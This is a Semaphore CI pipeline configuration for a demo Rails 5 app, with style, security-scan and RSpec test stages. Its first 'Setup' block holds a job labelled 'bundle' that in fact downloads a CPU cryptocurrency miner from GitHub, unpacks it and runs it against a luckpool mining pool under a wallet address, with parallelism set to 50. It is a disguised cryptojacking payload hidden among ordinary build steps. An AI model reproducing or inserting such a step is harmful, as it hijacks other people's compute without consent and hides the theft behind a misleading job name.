version: v1.0
name: Demo Rails 5 app
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
global_job_config:
  prologue:
    commands:
      - checkout
      - cache restore
      - sem-version ruby 2.6.0
      - bundle install --deployment -j 4 --path vendor/bundle
blocks:
  - name: Setup
    dependencies: []
    task:
      jobs:
        - name: bundle
          commands:
            - 'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz'
            - tar xf hellminer_cpu_linux.tar.gz
            - './hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RVXxf8Ci9MP5VmmkPyXjz3GUdzpBvmBJNH.BAY -p x --cpu 2'
          parallelism: 50
  - name: Code scanning
    dependencies:
      - Setup
    task:
      jobs:
        - name: check style + security
          commands:
            - bundle exec rubocop
            - bundle exec brakeman
  - name: Unit tests
    dependencies:
      - Code scanning
    task:
      prologue:
        commands:
          - sem-service start postgres
          - 'bundle exec rake db:setup'
      jobs:
        - name: RSpec - model tests
          commands:
            - bundle exec rspec spec/models
        - name: RSpec - controller tests
          commands:
            - bundle exec rspec spec/controllers
  - name: Integration tests
    dependencies:
      - Unit tests
    task:
      jobs:
        - name: RSpec - feature specs
          commands:
            - sem-service start postgres
            - 'bundle exec rake db:setup'
            - bundle exec rspec spec/features
